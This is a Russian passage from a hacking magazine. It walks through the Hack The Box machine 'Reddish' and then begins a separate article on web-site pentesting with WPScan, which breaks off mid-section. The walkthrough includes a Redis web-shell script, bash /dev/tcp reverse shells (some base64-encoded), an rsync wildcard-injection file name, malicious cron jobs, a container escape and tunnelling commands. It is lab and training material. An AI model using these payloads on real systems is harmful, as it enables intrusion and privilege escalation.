  root@kali:~/dropbear‐2019.78# du ‐h dbclient
  520K    dbclient


Сперва я срезал всю отладочную информа цию с помощью Makefile, а затем
сжал бинарь упаковщиком исполняемых файлов UPX.
   Теперь сгенерируем пару «открытый/закрытый ключ» с помощью drop‐
bearkey и дропнем клиент и закрытый ключ на nodered.



  root@kali:~/dropbear‐2019.78# ./dropbearkey ‐t ecdsa ‐s 521 ‐f .secret
  Generating 521 bit ecdsa key, this may take a while...
  Public key portion is:
  ecdsa‐sha2‐nistp521 AAAAE2VjZHNhLXNoYTItbmlzdHA1MjEAAAAIbmlzdHA1M‐
  jEAAACFBAA2TCQk3VTYCX/hZjMmXT0/A27f5EOKQY4FbXcYeNWXIPLFQOOLnQFWbA‐
  jBa9qOUdmwOipVvDwXnvt6hEmwitflvQEIw9wHQ4spUAqs/0CR6AoiTT3w7v6CAX/
  uq0u2oS7gWf9SPy/Npz8Ond6XJKh+d0QPXz0uQrq0wyprCYo+g/OiEA== root@kali
  Fingerprint: sha1!! ef:6a:e8:e0:f8:49:f3:cb:67:34:5d:0b:f5:cd:c0:e5:8e:
  49:28:41





         Загружаем SSH‐клиент dbclient и ключ .secret на nodered

Все, SSH‐клиент вместе с 521‐битным при ватным клю чом (на эллипти ке) уле‐
тели в контейнер. Теперь создадим фиктивного пользовате ля с шеллом
/bin/false, чтобы не подставлять свою машину — вдруг кто‐то наткнется
на закрытый ключ?



  root@kali:~# useradd ‐m snovvcrash
  root@kali:~# vi /etc/passwd
  ... Меняем шелл юзера snovvcrash на "/bin/false" ...
  root@kali:~# mkdir /home/snovvcrash/.ssh
  root@kali:~# vi /home/snovvcrash/.ssh/authorized_keys
  ... Копируем открытый ключ ...


Все готово, можно проб расывать туннель.



  root@nodered:/tmp# ./dbclient ‐f ‐N ‐R 8890:172.19.0.3:80 ‐i .secret ‐y
  snovvcrash@10.10.14.19


 • f — свернуть клиент в бэкгра унд пос ле аутентификации на сервере;
 • N — не выполнять команды на сервере и не запрашивать шелл;
 • R  8890:172.19.0.3:80 —  слушать  localhost:8890  на   Kali
   и перенаправлять все, что туда попадет, на 172.19.0.3:80 ;
 • i .secret — аутентифика ция по при ватному ключу .secret;
 • y — автоматически добавлять хост с отпечатком его открытого ключа
   в список доверенных.

На Kali можно проверить успешность создания туннеля с помощью канонич‐
ного netstat или его новомодной альтернативы ss.



  root@kali:~# netstat ‐alnp | grep LIST | grep 8890
  tcp         0  0  127.0.0.1:8890     0.0.0.0:*  LISTEN      236550/sshd:
  snovvc
  tcp6        0  0  ::1:8890           :::*       LISTEN      236550/sshd:
  snovvc
  root@kali:~# ss | grep 1880
  tcp  ESTAB  0  0  10.10.14.19:43590  10.10.10.94:1880


Открываем браузер — и на localhost:8890 находим тот самый эндпойнт,
маршрут к которому мы прокладывали.





  Проверяем доступность веб‐сайта на 172.19.0.4 через обратный SSH‐
  туннель

It works! Видеть такие надписи мне однозначно нравится.
   Как я и говорил, это всего лишь при мер. Дальше для продвижения по вир‐
туалке Reddish мы будем пользовать ся клиент‐сервером Chisel.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
       ДЬЯВОЛЬСКИ-
   КРАСНЫЙ ПЕНТЕСТ
         СТРОИМ ЦЕПОЧКИ ТУННЕЛЕЙ ЧЕРЕЗ ДОКЕР‐
         КОНТЕЙНЕРЫ НА ВИРТУАЛКЕ С HACK THE BOX





Chisel

     Быс трые TCP-туннели от Chisel. Транспор тиров ка по HTTP. Безопас-
      ность по SSH. Мы наш, мы новый мир пос троим

Ладно, возможно, разработчик описыва ет свой софт чуть менее пафос но,
но у меня в голове оно проз вучало имен но так.
  А если серьезно, то Chisel — это связка «клиент + сервер» в одном при‐
ложении, написанном на Go, которое позволяет прокладывать защищенные
туннели в обход ограничений файрвола. Мы будем использовать Chisel, что‐
бы настроить реверс‐коннект с контейнера nodered до Kali. По большому
счету его предназначение близко к туннелированию посредством SSH —
даже синтаксис команд похож.
   Чтобы не запутаться в хитрос плетениях соединений, я буду вести сетевую
«карту местности». Пока у нас есть информа ция только о nodered и www.





            Сетевая карта. Часть 1: Начальные сведения

Загрузим и соберем Chisel на Kali.



  root@kali:~# git clone http://github.com/jpillora/chisel && cd chisel
  root@kali:~/chisel# go build
  root@kali:~/chisel# du ‐h chisel
  12M     chisel


Объем 12 Мбайт — это немало в усло вии транспортировки исполняемого
файла на машину‐жертву. Хорошо бы так же сжать бинарник, как мы делали
это с dropbear: с помощью фла гов линковщика ‐ldflags уберем отладочную
информацию, а затем упакуем файл в UPX.



  root@kali:~/chisel# go build ‐ldflags='‐s ‐w'
  root@kali:~/chisel# upx chisel
  root@kali:~/chisel# du ‐h chisel
  3.2M    chisel


Класс, теперь перенесем chisel в кон тейнер и создадим туннель.



  root@kali:~/chisel# ./chisel server ‐v ‐reverse ‐p 8000


Первым действием поднимаем сервер на Kali, который слушает активность
на 8000‐м порте (‐p 8000) и разрешает создавать обратные подключения (‐
reverse).



  root@nodered:/tmp# ./chisel client 10.10.14.19:8000
  R:127.0.0.1:8890:172.19.0.3:80 &


Теперь подключаемся к этому серверу с помощью клиента на nodered.
Команда выше откроет 8890‐й порт на Kali (флаг R), через который трафик
будет попадать в 80‐й порт хос та 172.19.0.3. Если не указать сетевой
интерфейс на обратном соединении явно (в данном случае 127.0.0.1), то
будет использован 0.0.0.0. Это означает, что любой учас тник сети сможет
юзать нашу машину для общения с 172.19.0.3:80. Нас это не устраивает,
так  что приходится  вручную прописывать 127.0.0.1. В этом  отличие
от дефолтного SSH‐клиента, где по умол чанию всегда будет использован
127.0.0.1.





        Сетевая карта. Часть 2: Туннель до веба через nodered


Иссле дование веб‑сайта
Если открыть localhost:8890 в браузере, нас снова встретит радос тная
новость, что «it works!». Это мы уже видели, поэтому откроем сорцы веб‐стра‐
нички в поисках интересного кода.
  Целиком исходник вставлять не буду, только скриншот с инте ресными
моментами.





       Исходный код главной стра ницы веб‐сайта (172.19.0.3:80)

Комментарий (синим) гласит, что где‐то сущес твует контейнер с базой дан‐
ных, у которой есть доступ к сетевой папке это го сервера. Аргументы функции
test (красным) в совокупности с упо мина нием некой базы данных напоми‐
нают команды GET и INCR в NoSQL‐СУБД Redis. С при мерами тес товых зап‐
росов через ajax можно поиграть в браузере и убедиться, что они и правда
работают — в отличие от еще не реализованной функции backup.
  Пока все сходится — и, сдается мне, я знаю, где искать Redis: как ты пом‐
нишь, у нас оставался еще один неопознанный хост с откры тым 6379‐м пор‐
том... Как раз самым что ни на есть дефолтным пор том для Redis.


Redis
Пробросим еще один обратный туннель на Kali, который будет идти к порту
6379.



  root@nodered:/tmp# ./chisel client 10.10.14.19:8000
  R:127.0.0.1:6379:172.19.0.3:6379 &





        Сетевая карта. Часть 3: Туннель до Redis через nodered

Всё — можно стучаться в гос ти к Redis со своей машины. К примеру, прос‐
канируем 6379‐й порт с помощью Nmap — бла го теперь у нас есть весь арсе‐
нал NSE для идентификации сервисов. Не забыва ем о флаге ‐sT — ведь
сырые пакеты не умеют ходить через туннели.



  root@kali:~# nmap ‐n ‐Pn ‐sT ‐sV ‐sC localhost ‐p6379
  ...
  PORT     STATE SERVICE VERSION
  6379/tcp open  redis   Redis key‐value store 4.0.9
  ...


Как предлагают в этом посте, проверим, нужна ли авторизация для взаимо‐
действия с БД.





       Проверяем, нужна ли авто риза ция для вза имодействия с БД

Похоже, что нет, — значит, мож но дальше раскручивать этот вектор. Я не буду
инжектить свой открытый ключ в контейнер для подключения по SSH,
как советуют на Packet Storm (потому что нет самого SSH), — но зато никто
не запрещает залить веб‐шелл в рас шаренную пап ку веб‐сервера.
  Общаться с СУБД можно в простом подключении netcat/telnet, однако кру‐
че скачать и собрать нативный CLI‐клиент из исходников самой базы данных.



  root@kali:~# git clone https://github.com/antirez/redis && cd redis
  root@kali:~/redis# make redis‐cli
  root@kali:~/redis# cd src/
  root@kali:~/redis/src# file redis‐cli
  redis‐cli: ELF 64‐bit LSB shared object, x86‐64, version 1 (SYSV), dy‐
  namically linked, interpreter /lib64/ld‐linux‐x86‐64.so.2, BuildID[sha1]
  =c6e92b4603099564577d4027ba5fd7f20da68230, for GNU/Linux 3.2.0, with de‐
  bug_info, not stripped


Удостоверимся, что все работа ет, — попробуем команды, которые мы видели
в сорцах веб‐страницы.





                         Тестиру ем redis‐cli

Отлично, теперь можно сделать нечто более зловредное, а именно —
записать веб‐шелл в /var/www/html/. Для этого нужно:
 1. Очистить ключи для всех БД.
 2. Создать в новой БД новую пару <ключ>, <значение> с веб‐шел лом
   в качестве значения.
 3. Задать имя новой БД.
 4. Задать путь для сох ранения новой БД.
 5. Сохранить файл новой БД.


             INFO

                    Ин тересный момент: Redis оптимизирует хра‐
                      нение значений, если в них присутствуют пов‐
                        торяющиеся паттерны, поэтому не всякий пей‐
                         лоад, записан ный в БД, отработает корректно.


Напишем скрипт на Bash, который будет «про игры вать» эти пять шагов выше.
Автоматизация нужна: вскоре мы выяс ним, что веб‐директория очищается
каждые три минуты.


#!/usr/bin/env bash


~/redis/src/redis‐cli ‐h localhost flushall
~/redis/src/redis‐cli ‐h localhost set pwn '<?php system($_REQUEST['
cmd']); ?>'
~/redis/src/redis‐cli ‐h localhost config set dbfilename shell.php
~/redis/src/redis‐cli ‐h localhost config set dir /var/www/html/
~/redis/src/redis‐cli ‐h localhost save





                Пример работы скрипта pwn‐redis.sh

Скрипт отработал успешно, поэтому можно открыть браузер — и после
перехода  по  адресу  http://localhost:8890/shell.php?cmd=whoami
получить такой ответ.





                     От вет команды whoami

Таким образом, у нас есть RCE в контейнере 172.19.0.3 (будем называть
его www, ведь он сам так представился).





                    От вет команды hostname

Раз есть RCE, неплохо было бы получить шелл.


ДОКЕР. КОНТЕЙНЕР II: WWW
Неплохо бы, да вот есть одно но: хост www умеет общаться только с nodered,
а напрямую связаться с Kali он не может. Зна чит, будем создавать очередной
туннель (третий по счету) поверх существующего обратного — и через него
ловить callback от www на Kali. Новый туннель будет прямым (или «локаль‐
ным»).



  root@nodered:/tmp# ./chisel client 10.10.14.19:8000 7001:127.0.0.1:9001
  &


Что здесь произошло: мы подключились  к серверу 10.10.14.19:8000
и вместе с этим проложили туннель, который берет начало в 7001‐м порте
контейнера nodered, а заканчивается в 9001‐м порте ВМ Kali. Теперь все, что
попадет в интерфейс 172.19.0.4:7001, будет автоматически перенаправле‐
но на машину атакующего по адресу 10.10.14.19:9001. То есть мы сможем
собрать реверс‐шелл и в качес тве цели (RHOST:RPORT) указать контейнер
172.19.0.4:7001, а отклик придет уже на локальную (LHOST:LPORT) тачку 10.
10.14.19:9001. Элементарно, Ватсон!





        Сетевая карта. Часть 4: Первый туннель до Kali с nodered

Я добавил две допол нительные стро ки в скрипт pwn‐redis.sh: «отправить
шелл» и «запустить слушателя на порт 9001».


...
(sleep 0.1; curl ‐s ‐X POST ‐d
'cmd=bash%20‐c%20%27bash%20‐i%20%3E%26%20%2Fdev%2Ftcp%2F172.19.0.
4%2F7001%200%3E%261%27' localhost:8890/shell.php >/dev/null &)
rlwrap nc ‐lvnp 9001

Пейлоад для curl закодирован в Percent‐encoding, чтобы не мучиться с «пло‐
хими» символами. Вот так он выглядит в «человеческом» виде.


bash ‐c 'bash ‐i >& /dev/tcp/172.19.0.4/7001 0>&1'

Теперь в одно действие получа ем сессию на www.





               Получение сес сии в кон тейнере www

Предлагаю осмотреться.





          Смотрим информацию о сетевых интерфей сах в www

Во‐первых, этот контейнер также имеет дос туп в две подсети: 172.19.0.0/16
и 172.20.0.0/16.





          Директория backup в кор не файловой системы www

В корне файловой системы — интересная директория /backup, которая
встречается доволь но час то на виртуалках Hack The Box (да и в реальной жиз‐
ни тоже). Внутри — скрипт backup.sh со следующим содержимым.


cd /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
rsync ‐a *.rdb rsync://backup:873/src/rdb/
cd / && rm ‐rf /var/www/html/*
rsync ‐a rsync://backup:873/src/backup/ /var/www/html/
chown www‐data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b

Здесь мы видим:
 • обращение к пока неиз вестному нам хосту backup;
 • использование rsync, что бы бэкапить все файлы с расширением .rdb
   (файлы БД Redis) на удаленный сервер backup;
 • использование rsync для вос ста новления резервной копии (которая также
   находится где‐то на сервере backup) содержимого /var/www/html/.

Думаю, уязвимость видна невооруженным глазом (мы уже делали что‐то
подобное с 7z): админ юзает * (2‐я строка) для обращения ко всем rdb‐фай‐
лам. А поскольку в арсенале rsync есть флаг для выпол нения команд, хакер
может создать скрипт с особым именем, идентичным синтакси су для триг‐
гера команд, и выполнять какие угодно дей ствия от имени того, кто запускает
backup.sh.





                          Справка rsync

Могу поспорить, что скрипт выполняется по планировщику cron.





           Задача выполнения backup.sh каждые три минуты

Класс, значит, он будет выполнен от имени root! Приступим к эксплуатации.


Эскалация до root
Сперва в директории /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
создадим файл pwn‐rsync.rdb — с обычным реверс‐шеллом, которые мы
сегодня видели уже сотню раз.


bash ‐c 'bash ‐i >& /dev/tcp/172.19.0.4/1337 0>&1'

После там же создадим еще один файл с ори гинальным име нем ‐e bash
pwn‐rsync.rdb.  Вот  как  выглядит  листинг  директории  сетевой шары
в момент перед получением шелла:



  www‐data@www:/var/www/html/f187a0ec71ce99642e4f0afbd441a68b$ ls
  ‐e bash pwn‐rsync.rdb
  pwn‐rsync.rdb


Осталось открыть новую вкладку терминала — и дождаться запус ка задания
cron.





            Получение привилегированной сес сии в www

И вот у нас есть root‐шелл!

Боль ше тун нелей!
Как ты понимаешь, отклик реверс‐шелла я отправил в контейнер nodered,
а ловил его на Kali. Для этого я предварительно проб росил еще один локаль‐
ный туннель на 1337‐м порте с nodered на свою машину.


 root@nodered:/tmp# ./chisel client 10.10.14.19:8000 1337:127.0.0.1:
 1337 &





        Сетевая карта. Часть 5: Вто рой туннель до Kali с nodered



Теперь можно честно забрать хеш юзера.





                   Забираем флаг пользователя

Но это всего лишь поль зовательский флаг, а мы по‐прежнему находимся
внутри docker. Что же теперь?


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
       ДЬЯВОЛЬСКИ-
   КРАСНЫЙ ПЕНТЕСТ
         СТРОИМ ЦЕПОЧКИ ТУННЕЛЕЙ ЧЕРЕЗ ДОКЕР‐
         КОНТЕЙНЕРЫ НА ВИРТУАЛКЕ С HACK THE BOX





ДОКЕР. КОНТЕЙНЕР III: BACKUP
Устройство скрипта для соз дания резервных копий должно навес ти на мысль:
каким образом проходит аутентификация на сервере backup? И ответ такой:
да в общем‐то, никаким. Доступ к файловой сис теме этого контейнера может
получить любой, кто сумеет дотянуть ся по сети до www.
  Мы уже видели вывод ip addr для www и поняли, что у этого контейнера
есть доступ в подсеть 17.20.0.0/24, однако кон кретный адрес сервера
backup нам  все еще  неизвестен. Мож но  предположить,  что  его  IP
17.20.0.2 — по аналогии с раскладом остальных узлов сети.
  Поищем подтверждение нашему предположению. В файле /etc/hosts
нет информации о принадлежнос ти сервера backup, однако узнать его адрес
можно еще одним способом: отправим всего один ICMP‐запрос с www
до backup.



  www‐data@www:/$ ping ‐c1 backup
  ping: icmp open socket: Operation not permitted


Делать это нужно из привилегированного шелла, потому что у юзера www‐
data не хватает прав для открытия нуж ного сокета.



  root@www:~# ping ‐c1 backup
  PING backup (172.20.0.2) 56(84) bytes of data.
  64 bytes from reddish_composition_backup_1.reddish_composition_internal‐
  network‐2 (172.20.0.2): icmp_seq=1 ttl=64 time=0.051 ms


  ‐‐‐ backup ping statistics ‐‐‐
  1 packets transmitted, 1 received, 0% packet loss, time 0ms
  rtt min/avg/max/mdev = 0.051/0.051/0.051/0.000 ms


Таким нехитрым способом мы убедились, что адрес backup — 172.20.0.2.
Дополним карту сетевых вза имо действий.





        Сетевая карта. Часть 6: Локализация контейнера backup

Теперь вернемся к рас суждению выше: у нас есть дос туп к www и есть rsync
без аутентификации (на 873‐м порте) — следовательно, у нас есть права
на чтение/запись в фай ловую систему backup.
  Например, я могу прос мотреть корень ФС backup.



  www‐data@www:/tmp$ rsync rsync://backup:873/src/
  ...





          Листинг корня файловой системы контейнера backup

Или прочитать файл shadow.



  www‐data@www:/tmp$ rsync ‐a rsync://backup:873/etc/shadow .
  www‐data@www:/tmp$ cat shadow
  ...





              Чтение файла /etc/shadow контейнера backup

А также записать любой файл в любую директорию на backup.



  www‐data@www:/tmp$ echo 'HELLO THERE' > .test
  www‐data@www:/tmp$ rsync ‐a .test rsync://backup:873/etc/
  ‐rw‐r‐‐r‐‐             12 2020/02/02 16:25:49 .test





      Запись тестового файла в директорию /etc контейнера backup

Попробуем таким образом получить шелл: я соз дам вредоносную задачу cron
с реверс‐шеллом, запишу ее в /etc/cron.d/ на сервере backup и пой маю
отклик на Kali. Но у нас очередная проб лема сетевой дос тупнос ти: backup
умеет говорить толь ко с www, а www только с nodered… Да, ты правильно
понимаешь, придется строить це поч ку туннелей: от backup до www, от www
до nodered и от nodered до Kali.


По луче ние root-шел ла
Следуя принципам динамичес кого прог раммирования, декомпозируем слож‐
ную задачу на две простые подзадачи, а в конце объеди ним результаты.
  Первая: пробросим локальный порт 1111 из контейнера nodered до порта
8000 на Kali, где работает сервер Chisel. Это поз волит нам обращаться к 172.
19.0.4:1111 как к серверу Chisel на Kali.



  root@nodered:/tmp# ./chisel client 10.10.14.19:8000 1111:127.0.0.1:8000
  &


Вторая: настроим переадресацию с www на  Kali. Для этого подключимся
к 172.19.0.4:1111 (так же, как если бы мы могли под ключиться к Kali нап‐
рямую) и пробросим локальный порт 2222 до пор та 3333 на Kali.



  www‐data@www:/tmp$ ./chisel client 172.19.0.4:1111 2222:127.0.0.1:3333 &


Теперь все, что попадет в порт 2222 на www, будет перенаправлено по цепоч‐
ке туннелей в порт 3333 на машину ата кующего.





   Сетевая карта. Часть 7: Цепочка туннелей www <=> nodered <=> Kali


При меча ние
Для некоторых утилитарных целей (нап ример, доставить исполняемый файл
chisel в контейнер www) было открыто еще 100500 вспомогательных тун‐
нелей — их описание я не стал вклю чать в текст прохождения и добавлять
на сетевую карту, чтобы не запутывать читателя еще больше.


Остается создать реверс‐шелл, cron‐задачу, залить это все на backup, дож‐
даться запуска cron и поймать шелл на Kali. Сделаем же это.
  Создаем шелл.



  root@www:/tmp# echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjAuMC4‐
  zLzIyMjIgMD4mMScK | base64 ‐d > shell.sh
  root@www:/tmp# cat shell.sh
  bash ‐c 'bash ‐i >& /dev/tcp/172.20.0.3/2222 0>&1'


Создаем cronjob, который будет выполняться каждую минуту.



  root@www:/tmp# echo '* * * * * root bash /tmp/shell.sh' > shell


Заливаем оба файла на backup с помощью rsync.



  root@www:/tmp# rsync ‐a shell.sh rsync://backup:873/src/tmp/
  root@www:/tmp# rsync ‐a shell rsync://backup:873/src/etc/cron.d/


И через мгновение нам приходит коннект на 3333‐й порт Kali.





                 Ловим root‐сес сию backup на Kali


ФИНАЛЬНЫЙ ЗАХВАТ ХОСТА REDDISH
Прогулявшись по файловой системе backup, можно увидеть такую картину.





       Листинг устрой ств sda* в директории /dev контейнера backup

В директории /dev оставлен доступ ко всем накопителям хостовой ОС.
Это означает, что на Reddish контейнер был запущен с флагом ‐‐privileged.
Это наделяет докер‐процесс практичес ки всеми пол номочи ями, которые
есть у основного хоста.


        WWW

                    Ин тересная презентация по аудиту докер‐контей‐
                        неров: Hacking Docker the Easy way.


Если мы смонтируем, к примеру, /dev/sda1, то сможем совершить побег
в файловую систему Reddish.





  Монтируем /dev/sda1 и запрашиваем лис тинг корня ФС основного хос та

Шелл можно получить тем же способом, каким мы попали в контейнер
backup: создадим cronjob и дропнем его в /dev/sda1/etc/cron.d/.



  root@backup:/tmp/sda1/etc/cron.d# echo 'YmFzaCAtYyAnYmFzaCAtaSA+Ji‐
  AvZGV2L3RjcC8xMC4xMC4xNC4xOS85OTk5IDA+JjEnCg==' | base64 ‐d >
  /tmp/sda1/tmp/shell.sh
  root@backup:/tmp/sda1/etc/cron.d# cat ../../tmp/shell.sh
  bash ‐c 'bash ‐i >& /dev/tcp/10.10.14.19/9999 0>&1'
  root@backup:/tmp/sda1/etc/cron.d# echo '* * * * * root bash /tmp/shel‐
  l.sh' > shell


И теперь отклик реверс‐шелла придет уже человеческим образом — через
реальную сеть 10.10.0.0/16 (а не через деб ри виртуальных интерфейсов
докера) на порт 9999 ВМ Kali.





                Ловим root‐сес сию Reddish на Kali

Если вызвать ip addr, мож но видеть нагромождение сетей docker.





             Список сетевых интерфейсов хоста Reddish

Вот и все! Осталось забрать рутовый флаг — и виртуалка пройдена.



  root@backup:/tmp/sda1# cat root/root.txt
  cat root/root.txt
  50d0db64????????????????????????





                             Трофей


        WWW

                     Неп лохой читшит со списком утилит для решения
                       задач маршрутизации  трафика —  PayloadsAll‐
                         TheThings / Network Pivoting Techniques



ЭПИЛОГ
Кон фигурация docker
У нас есть полноправный доступ к системе, поэтому из любопытства можно
открыть конфигурацию docker /opt/reddish_composition/docker‐compose.yml.
  Из нее мы видим:
 • список портов, доступных «сна ружи» (строка 7);
 • разделяемую с контейнерами www и redis внут реннюю сеть (строка 10);
 • конфигурации всех кон тейнеров (nodered, www, redis, backup);
 • флаг privileged, с которым запущен кон тейнер backup (строка 38).

В соответствии с найденным конфигом я в последний раз обновлю свою
сетевую карту.





          Сетевая карта. Часть 8: Файловая система Reddish


Chisel SOCKS
Откровенно говоря, Reddish можно было прой ти гораздо проще, ведь Chisel
поддерживает SOCKS‐прокси. Это значит, что нам вообще‐то не нужно было
вручную возводить отдельный туннель под каж дый пробрасываемый порт.
Безусловно, это полезно в учебных целях — чтобы понимать, как это все
работает, однако настройка прокси‐сервера значительно упрощает жизнь
пентестеру.
   Единственная трудность заключается в том, что Chisel умеет запускать
SOCKS‐сервер толь ко в режиме chisel server. То есть нам нужно было бы
положить Chisel на про межу точный хост (нап ример, nodered), запустить его
в режиме сервера и подклю чаться к этому серверу с Kali. Но именно это мы
и не могли сделать! Как ты помнишь, мы сперва пробросили реверс‐соеди‐
нение к себе на машину, что бы вза имодей ствовать с внутренней сетью
докер‐контейнеров.
  Но и здесь есть выход: можно запустить «Chisel поверх Chisel». В этом слу‐
чае первый Chisel будет вес ти себя как обычный сервер, который организует
нам backconnect к nodered, а второй — как сервер SOCKS‐прокси уже
в самом контейнере nodered. Убедимся на примере.



  root@kali:~/chisel# ./chisel server ‐v ‐reverse ‐p 8000


Первым делом, как обычно, запускаем сервер на Kali, который раз решает
обратные подклю чения.



  root@nodered:/tmp# ./chisel client 10.10.14.19:8000
  R:127.0.0.1:8001:127.0.0.1:31337 &


Потом делаем обратный проброс с nodered (порт 31337) на Kali (порт 8001).
Теперь все, что попадает на  Kali через localhost:8001, отправляется
в nodered на localhost:31337.



  root@nodered:/tmp# ./chisel server ‐v ‐p 31337 ‐‐socks5


Следующим шагом запус каем Chisel в режиме SOCKS‐сервера на nodered —
слушать порт 31337.



  root@kali:~/chisel# ./chisel client 127.0.0.1:8001 1080:socks


В завершение активируем дополнительный клиент Chisel на Kali (со значени‐
ем socks в качестве remote), который подключается к локальному порту 8001.
А дальше начинается магия: трафик переда ется через порт 1080 SOCKS‐
прокси по обратному  туннелю  (его обслуживает первый сервер  Chisel
на 8000‐м порте) и попадает на интерфейс 127.0.0.1 кон тейнера nodered —
в порт 31337, где уже развернут SOCKS‐сервер. Фух.



  root@kali:~# proxychains4 nmap ‐n ‐Pn ‐sT ‐sV ‐sC 172.19.0.3 ‐p6379
  ...
  PORT     STATE SERVICE VERSION
  6379/tcp open  redis   Redis key‐value store 4.0.9
  ...


С этого момента мы можем обра щать ся к любому хосту по любому порту,
если до них может дотянуть ся nodered, — а SOCKS‐прокси выполнит всю
маршрутизацию за нас.
 ВЗЛОМ
HACK
THE WEB!

 КАК ПРОВЕРИТЬ САЙТ
 НА УЯЗВИМОСТИ
И КАК ИХ
 ЭКСПЛУАТИРУЮТ





                             8bit
                       vegelin47@mail.ru





 Взлом сайтов — один из самых распространенных типов
 атак. Если тебе интересно, как взла мыва ют сайты и на что
 нужно обратить внимание, что бы защитить свой ресурс, то
 эта статья для тебя. Здесь я разберу самые начала пентеста
 веб‐приложений  и  на  примерах  покажу,  как  работать
 с популярными движками.


 На январь 2020 года в интернете насчитыва ется 1,74 мил лиарда сайтов,
 и многие из них уязвимы. Десять лет назад ис следова ние Web Application Se‐
 curity Consortium показа ло, что минимум 13% сай тов можно взломать авто‐
 матически. А в недавнем исследова нии Positive Technologies сообщается
 об уязвимости 19% протестированных веб‐приложений. Поистине огромный
 простор для действий зло умышленников!


 ОБЩИЕ ПРИНЦИПЫ ВЗЛОМА САЙТОВ
 По структуре сайты делятся на три больших класса:
  • самописные (сделанные вручную на HTML, произве денные статическим
    генератором типа Jekyll или соб ранные в программе‐конструкторе типа
   Adobe Dreamweaver);
  • сделанные в онлайновых конструкторах (в основном это сайты‐визитки
    без каких‐либо баз данных и переда ваемых полей);
  • работающие на готовых CMS (Content Management System, системах
    управления контентом).

 Встречаются еще самодельные CMS, соз данные для конкретного сайта,
 но это сейчас стало ред костью — позволить себе поддержку своей сис темы
 могут только самые крупные ресурсы, и оправдать связанные с этим затраты
 непросто.
   В основе большинства современных сайтов — готовые движки. Например,
 Xakep.ru не исключение: он работает на популярной системе WordPress (по
 крайней мере сейчас, в 2020 году).
   С точки зре ния атакующего, движки сайтов ничем не отличаются от других
 сервисов и служб. Их исходный код обычно находится в общем доступе,
 и любой исследователь может проанализи ровать его на ошиб ки, в том чис ле
 бреши в безопасности. Поэто му сайты на CMS редко становятся жертвами
 целевой атаки. Чаще их лома ют мас сово.
    Такой взлом автоматизирован и обычно протекает по сле дующей схе ме:
 злоумышленник находит уязвимость (самостоятель но или просто  гуглит
 что‐то све жее). Затем он делает экс плоит или берет готовый и пишет спе‐
 циализированный бот. Этот бот ищет ука занную дыру на всех сайтах подряд
 в заданном диапазоне и пытается эксплуатировать ее.
    Казалось бы, для защиты от автоматических атак надо всего‐то поддержи‐
 вать программное обеспечение в акту альном состоянии, но в реальности
 CMS обрастает разными дополнениями, и уследить за всеми становится
 сложно.
   При пентесте стоит несколько иная задача — проверить конкретный сайт
 на уязвимости. Об этом мы и поговорим.


            WARNING

                         Статья предназначена для «белых хакеров», про‐
                     фессиональных  пен тесте ров  и  руководите лей
                        службы информацион ной безопасности (CISO).
                     Ни автор, ни редакция не несут ответственности
                         за любой возможный вред, причиненный этим
                       материалом.



 РАЗВЕДКА
 Прежде чем пытаться ата ковать цель, нуж но собрать информацию о ней.
 Для этого хорошо подходит инс тру мент WhatWeb. Эта утилита предоставляет
 подробную информацию о CMS жертвы и исполь зованных ей веб‐инс трумен‐
 тах.
   Советую запускать WhatWeb с ключом ‐а, ука зывая после него зна‐
 чение 3 или 4. Разница между ними только в том, что во втором случае
 WhatWeb будет сканировать еще и субдиректории. Имей в виду, что оба вари‐
 анта задают агрессив ный метод опро сов — со всеми вытекающими, а точнее
 «втекающими» на сервер логами.
    Вот пример запуска и соб ранных ответов:



   $ whatweb ‐a3 https://URL


   https://URL [200 OK] Cookies[PHPSESSID], Country[UNITED KINGDOM][GB],
   Frame, HTML5, JQuery[1.9.0,2.2.3], Open‐Graph‐Protocol[website],
   PHP[7.1.33], PasswordField[password],
   Script[application/ld+json,text/javascript], Title[Bower Partnerships |
   Best Equity Release Broker Customer Service 2019],
   UncommonHeaders[link,x‐robots‐tag,alt‐svc], WordPress, X‐Powered‐
   By[PHP/7.1.33], X‐UA‐Compatible[IE=EDGE]


 Здесь мы видим, что это сайт британской компании, сделанный на WordPress,
 используется PHP v. 7.1.33 и jQuery 1.9.0, 2.2.3. Неп лохо для начала!
    Если у тебя нет VPN или ты прос то не хочешь заморачиваться с установ‐
 кой, обрати внимание на онлайновую версию WhatWeb.





                         WhatWeb online

 Кстати, при работе с заграничными сайтами она дает большую скорость.
    Если тебе достаточ но определить только наз вание CMS, то для этого есть
 отдельные сервисы, даже рус скоязычные.
    Вот свежая статистика популярности раз личных CMS в рунете:
  • WordPress — 58,12%;
  • Joomla — 17,12%;
  • OpenCart — 4,65%;
  • Drupal — 3,75%;
  • Wix — 3,74%;
  • MODX Revolution — 2,81%;
  • MODX Evolution — 2,76%;
  • Nethouse — 2,23%;
  • прочие — 4,78%.


 WORDPRESS
 Поскольку WordPress — это сейчас самая популярная CMS, то перей дем сра‐
 зу к ней. Под нее выпущен очень мощ ный сканер, который умеет творить
 магию, — WPScan. На  момент  написания  статьи  актуальная  версия
 была 3.7.8. Этот сканер умеет определять версию сканируемого объ екта,
 брутить админку (у него даже есть свой встроенный словарь), смотреть уяз‐
 вимые открытые директории, определять уста новленные плагины и много
 всего другого. К тому же он предустановлен в Kali Linux и в других дистрибути‐
 вах для пентесте ров. Есть даже версия в докер‐кон тейнере.
   На мой взгляд, управление и клю чи WPScan мог ли бы и упростить. Даже
 хелпа у программы два — краткий (‐h) и подробный (‐‐hh).
   Перед первым исполь зованием WPScan необходимо обновить его базу
 данных.


 wpscan ‐‐update

 После этого начинаем сканирование. Сам по себе WPScan без ключей
 выдаст общую информацию о сайте, лишь поверхностно прос канировав
 цель.


 wpscan ‐‐url http://example.com





                           WPScan

 После строчки Interesting Finding(s): начина ются те самые моменты,
 на которые стоит обратить внимание:
  • версия WP;
  • открытые директории;
  • подозрения на уязвимости;
  • ссылки на ресурсы, где об этих уязвимос тях можно почитать.

 В конце вывода красным восклицательным знаком помече ны строки, которые
 идут вразрез с правилами безопасности. В нашем случае это торчащий
 наружу конфигурационный файл wp‐config.php с логином и паролем к базе
 данных.





                      Конфигура ция WordPress

 Продолжаем копать и все тем же софтом пробуем сбрутить логин и пароль
 к админке:


